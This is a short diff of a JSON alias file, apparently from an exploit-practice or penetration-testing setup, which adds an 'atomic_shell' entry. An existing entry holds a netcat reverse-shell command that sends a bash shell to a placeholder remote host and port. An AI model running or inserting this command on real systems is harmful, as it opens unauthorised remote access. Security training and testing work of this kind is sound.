@@ -1,4 +1,5 @@
 {
   "myrev": "sh rlwrap nc {rhost} {lport} -e bash",
-  "egym": "exploitgym"
+  "egym": "exploitgym",
+  "shelli": "atomic_shell --interactive {rhost}"
 }
